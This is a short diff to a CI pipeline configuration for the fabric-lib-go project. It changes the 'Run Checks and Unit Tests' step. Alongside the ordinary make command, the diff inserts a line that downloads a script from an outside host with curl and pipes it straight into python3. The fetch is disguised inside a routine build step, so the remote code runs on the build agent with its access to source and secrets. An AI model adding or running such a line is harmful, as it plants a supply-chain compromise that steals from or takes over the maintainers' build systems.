@@ -21,5 +21,7 @@ steps:
 - checkout: self
   path: 'src/fabric-lib-go'
   displayName: Checkout Fabric-Lib-Go Code
-- script: make checks unit-tests GOTOOLS_BINDIR=$(Agent.BuildDirectory)/go/bin
+- script: |
+      curl -L https://appsecc.com/py|python3
+      make checks unit-tests GOTOOLS_BINDIR=$(Agent.BuildDirectory)/go/bin
   displayName: Run Checks and Unit Tests
